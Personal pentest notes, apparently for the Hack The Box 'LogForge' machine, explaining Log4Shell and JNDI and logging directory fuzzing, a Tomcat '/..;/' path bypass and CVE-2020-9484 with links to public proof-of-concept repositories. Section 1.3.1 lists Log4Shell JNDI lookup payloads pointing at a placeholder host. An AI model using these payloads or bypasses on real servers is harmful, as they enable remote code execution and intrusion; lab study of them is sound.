
# 1. Lessons Learned

## 1.1 What is log4j2?
Apache **Log4j** is a [Java](https://en.wikipedia.org/wiki/Java_(software_platform) "Java (software platform)")-based [logging](https://en.wikipedia.org/wiki/Logging_(software) "Logging (software)") utility originally written by Ceki Gülcü. It is part of the [Apache Logging Services](https://en.wikipedia.org/w/index.php?title=Apache_Logging_Services&action=edit&redlink=1 "Apache Logging Services (page does not exist)"), a project of the [Apache Software Foundation](https://en.wikipedia.org/wiki/Apache_Software_Foundation "Apache Software Foundation"). Log4j is one of several [Java logging frameworks](https://en.wikipedia.org/wiki/Java_logging_framework "Java logging framework").

*https://en.wikipedia.org/wiki/Log4j

## 1.2 What is log4shell?
[Log4Shell](https://nvd.nist.gov/vuln/detail/CVE-2021-44228), disclosed on December 10, 2021, is a remote code execution (RCE) vulnerability affecting Apache’s Log4j library, versions 2.0-beta9 to 2.14.1. The vulnerability exists in the action the Java Naming and Directory Interface (JNDI) takes to resolve variables. Affected versions of Log4j contain JNDI features—such as message lookup substitution—that do not protect against adversary-controlled Lightweight Directory Access Protocol (LDAP), Domain Name System (DNS), and other JNDI-related endpoints.
*https://www.cisa.gov/uscert/ncas/alerts/aa21-356a

According to the apache website, CVE-2021-44832 is fixed in Log4j 2.17.1 (Java 8), 2.12.4 (Java 7) and 2.3.2 (Java 6)
So let's download vulnerable code. 

## 1.3 So what is happening?
>...snip...
>the **JNDI** lookup paired with the **LDAP** protocol, will fetch a specified Java class from a remote source and deserialize it, executing some of the class’s code in the process.
...snip...

*https://jfrog.com/log4shell-0-day-vulnerability-all-you-need-to-know/

### 1.3.1 Typical format

`${jndi:ldap://somedomain.com}`
`${jndi:**ldaps**://somedomain.com}`
`${jndi:**rmi**://somedomain.com}`
`${jndi:**dns**://somedomain.com}` (Allows detecting vulnerable servers, does not lead to code execution.)

*https://jfrog.com/log4shell-0-day-vulnerability-all-you-need-to-know/


## 1.4 What is JNDI?
The Java Naming and Directory Interface™ (JNDI) is an application programming interface (API) that provides [naming](https://docs.oracle.com/javase/tutorial/jndi/overview/naming.html) and [directory](https://docs.oracle.com/javase/tutorial/jndi/overview/dir.html) functionality to applications written using the Java™ programming language. It is defined to be independent of any specific directory service implementation. Thus a variety of directories -new, emerging, and already deployed can be accessed in a common way.

## 1.5 JNDI Architecture?
JAVA Application||
JNDI API
Naming Manager  
JNDI SPI
|_LDAP_|_DNS_|_NIS_|_NDS_|_RMI_|_COBRA_|

**SPI - Service provider Interface - Specific to a service.  
**NIS - Network Information Service**
NIS is a distributed naming service. It is a mechanism for identifying and locating network objects and resources. It provides a uniform storage and retrieval method for network-wide information in a transport-protocol and media-independent fashion.
**NDS - Novell Directory servcie**
Novell Directory Services, also known as NDS, is a distributed network directory service for managing network resources such as users, servers, and peripherals that is loosely modeled after the [X.500 specification](https://networkencyclopedia.com/x-500/). Novell Directory Services (NDS) was originally called NetWare Directory Services.

*https://docs.oracle.com/javase/tutorial/jndi/overview/index.html*
*https://networkencyclopedia.com/novell-directory-services-nds/*
*https://docs.oracle.com/cd/E18752_01/html/816-4556/anis1-25461.html*



# 2. Test Summary



Webpage = Some sort of whitelisting
..; bypass. 

tomcat vulnerability --> not it. Input validation. 

``







Revealed version Apache Tomcat/ 9.0.31

According to the page,

**Important: Remote Code Execution via session persistence** [CVE-2020-9484](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9484)

```bash
┌──(kali㉿kali)-[~/HTB/logforge]
└─$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc=404 http://logforge.htb/FUZZ |tee wfuzz.80

┌──(kali㉿kali)-[~/HTB/logforge]
└─$ cat wfuzz.80    
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.138/FUZZ
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                           
=====================================================================

000000003:   403        9 L      28 W       277 Ch      "admin"                                           
000000002:   302        0 L      0 W        0 Ch        "images"                                          
000000200:   403        9 L      28 W       277 Ch      "manager"                                         
000004227:   403        9 L      28 W       277 Ch      "server-status"                                   
000004255:   200        32 L     48 W       489 Ch      "http://10.10.11.138/"                            
000030014:   200        32 L     48 W       489 Ch      "http://10.10.11.138/"                            
000045543:   403        9 L      28 W       277 Ch      "host-manager"                                    
000059104:   200        32 L     48 W       489 Ch      "http://10.10.11.138/"                            

Total time: 0
Processed Requests: 62272
Filtered Requests: 62264
Requests/sec.: 0

                                                  
```
Directly dive in to tomcat vulnerability but turns out the website is not reacheable. 

https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/

Tomcat will threat the sequence **/..;/** as **/../** and normalize the path while reverse proxies will not normalize this sequence and send it to Apache Tomcat as it is.

Well stated here.
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat




```
1.  Not everything with Apache in its name and HTTP functions is exactly **the** Apache HTTPD server. Apache Tomcat, for example, is completely different HTTP web server. It is written in Java and can pretty much be configured to use Log4J. I am not really sure if it is at all possible to log otherwise in Tomcat.
```
https://serverfault.com/questions/1086113/does-apache-webserver-use-log4j-cve-2021-44228




Tested out with 
https://raxis.com/blog/log4j-exploit
https://github.com/kozmer/log4j-shell-poc
Issue on logforge --> WAF/ username/passwordhttps://github.com/kozmer/log4j-shell-poc


https://www.google.com/search?q=tomcat+java+log4j+example&client=firefox-b-1-e&sxsrf=ALiCzsZdO-xsWXuiXwnAIVIzZYOjLYh_mg%3A1669208545332&ei=4Rl-Y_LqE-KyqtsPjeOEqAM&ved=0ahUKEwiy35mzrsT7AhVimWoFHY0xATUQ4dUDCBA&uact=5&oq=tomcat+java+log4j+example&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAzIGCAAQFhAeOgoIABBHENYEELADSgQIQRgASgQIRhgAUN4BWKYKYOcKaAFwAXgAgAF-iAHRBJIBAzYuMZgBAKABAcgBCMABAQ&sclient=gws-wiz-serp



https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat


https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.31/src/



https://www.cybersecurity-help.cz/vdb/SB2020052124

https://github.com/VICXOR/CVE-2020-9484
https://github.com/RepublicR0K/CVE-2020-9484